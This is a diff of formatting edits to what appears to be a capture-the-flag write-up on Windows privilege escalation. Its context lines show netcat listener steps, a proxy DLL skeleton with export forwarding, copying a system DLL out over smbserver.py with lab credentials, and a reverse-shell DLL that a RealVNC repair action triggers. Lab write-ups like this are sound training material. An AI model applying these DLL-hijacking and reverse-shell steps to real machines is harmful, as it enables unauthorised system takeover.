@@ -107,8 +107,6 @@ Just as putty stores credentials, any software that stores passwords, including 
 - start up netcat listener
 - restart service ``sc stop windowsscheduler`` ``sc start windowsscheduler`` (with powershell you need sc.exe as sc = set-content)
 
-
-
 ##### [](#header-5)Answer the questions below
 
 **Get the flag on svcusr1's desktop.**
@@ -160,6 +158,7 @@ Doing this on the target we can see its running RealVNC 6.8.0 and that has a pri
 **Create a Proxy DLL**
 
 1. proxy.c
+
 ```c
 #include <windows.h>
 
@@ -172,12 +171,15 @@ BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
     return TRUE;
 }
 ```
+
 2. proxy.def 
+
 ```c
 EXPORTS
     Method1=C:/Windows/System32/original.dll.Method1 @1
     Method2=C:/Windows/System32/original.dll.Method2 @2
 ```
+
 3. We need a list of all the exports available in the origional DLL we are replacing. Copy ``c:\Windows\System32\adsldpc.dll`` to our machine using ``smbserver.py``
 - ``mkdir share``
 - ``smbserver.py -smb2support -username thm-unpriv -password Password321 public share``
@@ -195,6 +197,7 @@ EXPORTS
 #### [](#header-4)Repeat with Reverse Shell To get Flag
 
 1. redo proxy.c
+
 ```c
 #include <windows.h>
 
@@ -207,6 +210,7 @@ BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
     return TRUE;
 }
 ```
+
 2. compile dll again/copy over, repeat VNC repair after setting up netcat listener on kali machine.
 
 ##### [](#header-5)Answer the questions below
